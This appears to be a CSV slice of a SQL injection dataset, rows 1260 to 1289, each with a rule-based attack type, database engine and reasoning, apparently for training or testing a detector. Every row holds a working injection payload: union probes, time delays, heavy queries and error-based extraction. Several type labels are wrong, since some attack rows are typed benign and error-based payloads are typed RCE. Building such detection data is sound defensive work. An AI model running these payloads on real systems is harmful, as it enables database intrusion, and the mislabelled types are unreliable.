row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1260,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'tmdj' like 'tmdj",1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
1261,"1 ) and make_set ( 4593 = 7765,7765 ) and ( 8517 = 8517",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1262,"-9958"" ) as jzvq where 3741 = 3741 union all select 3741,3741,3741#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1263,select ( case when ( 6434 = 3877 ) then 6434 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1264,"1"" ) ) as rpxd where 4929 = 4929",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1265,"-7794"" ) union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1266,1 ) ) as mlpf where 7425 = 7425,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1267,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'jrpk' = 'jrpk,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1268,1 ) ) ) waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1269,"1, ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1270,-9336' or 5641 = 9488#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1271,1'|| ( select 'noik' from dual where 9851 = 9851,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1272,"1"" where 7045 = 7045",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1273,"-3501"" ) ) ) or ( 6789 = 6990 ) *6990 and ( ( ( ""jnnc"" like ""jnnc",1,,boolean_blind,generic,0.95,") or (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
1274,"1%' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1275,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1276,-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
1277,"1 ) as wust where 3884 = 3884 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
1278,"1"" ) union all select null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1279,"-3955%' ) ) union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1280,"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
1281,select case when 6229 = 2077 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1282,select ( case when ( 5569 = 9390 ) then 5569 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1283,1' ) where 1363 = 1363,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1284,"1 ) union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1285,"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'wqme' = 'wqme",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1286,"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""gimc"" like ""gimc",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
1287,"-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1288,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) -- paxv,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1289,"1' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
